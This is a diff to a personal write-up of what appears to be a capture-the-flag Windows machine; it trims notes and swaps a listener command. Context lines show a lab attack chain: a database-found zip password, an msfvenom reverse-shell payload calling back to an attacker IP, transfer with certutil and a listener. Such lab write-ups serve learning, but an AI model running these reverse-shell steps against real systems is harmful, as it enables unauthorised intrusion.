@@ -33,11 +33,6 @@ created: 2025-08-30
 
 - `MS` Access
 
-**📚 Learned:**  
-
-- Don't forget about `cmdkey /list`.
-- Even easy machines can have rabbit holes.
-
 ----
 
 ## 🌐 Port Scan
@@ -125,7 +120,7 @@ Remember we also had a database. I found this in it:
 
 ![[Pasted image 20250829221603.png]]
 
-This (`auth_user`) was one of the only populated tables.
+`auth_user` was one of the only populated tables.
 
 I finally extracted the `.zip` file with the password `access4u@security`, which we found in the database.
 
@@ -140,7 +135,7 @@ This file was extracted:
 
 ```shell
 $ ls
- 'Access Control.pst'   backup.mdb    dumptypes.h   hash.txt       types.h
+ 'Access Control.pst'
 <SNIP>
 ```
 
@@ -242,7 +237,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.11 LPORT=1234 -f exe -o rev
 I transferred `rev.exe` to `C:\Temp\` with `certutil` and started a listener:
 
 ```shell
-listen windows 1234
+penelope -p 1234
 ```
 
 And run the reverse shell:
